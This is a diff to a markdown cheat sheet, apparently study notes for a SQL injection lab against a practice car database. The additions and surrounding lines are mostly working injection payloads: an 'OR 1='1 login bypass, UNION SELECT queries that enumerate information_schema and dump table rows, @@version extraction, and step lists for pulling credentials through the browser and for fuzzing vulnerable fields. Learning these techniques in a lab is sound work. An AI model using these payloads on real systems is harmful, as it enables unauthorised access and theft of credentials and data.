@@ -174,16 +174,22 @@ select carid, type from session.cars ;
 ## SQL injection
 ```
 'OR 1='1      #truth statement added to logins to get authentication
+POST METHOD EXAMPLE
 Audi 'UNION SELECT 1,2,3,4 #
 Audi 'UNION SELECT table_schema,2, table_name, column_name,5 from information_schema.columns #
 Audi 'UNION SELECT type,2,color,cost,year from session.car #
+# GET METHOD EXAMPLE
+UNION SELECT table_schema, table_name, column_name from information_schema.columns
+UNION SELECT table_schema,column_name,table_name from information_schema.columns
+# to get the version of the server you can use
+@@version      # use as a value in query
 ```
+
 ### Steps for creds
 - 1. input your true bool statement in both fields
 - 2. observe the get request with dev tool
 - 3. paste the get request into the html bar with a ? before to query it
 - 4. observe creds
-
 
 ### steps for fuzzzy/spitballing
 - 1. Identify the vuln field      # ford 'OR 1='1
